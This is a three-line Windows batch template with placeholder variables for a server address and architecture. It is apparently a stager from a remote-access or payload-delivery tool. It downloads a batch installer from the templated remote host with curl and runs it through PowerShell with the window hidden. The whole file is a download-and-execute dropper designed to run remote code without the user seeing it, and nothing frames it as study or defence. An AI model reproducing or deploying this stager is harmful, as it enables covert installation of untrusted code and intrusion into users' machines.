@echo off
curl {{ server_address }}installer/{{ arch }}.bat -o installer.bat
powershell -windowstyle hidden -command ".\installer.bat"
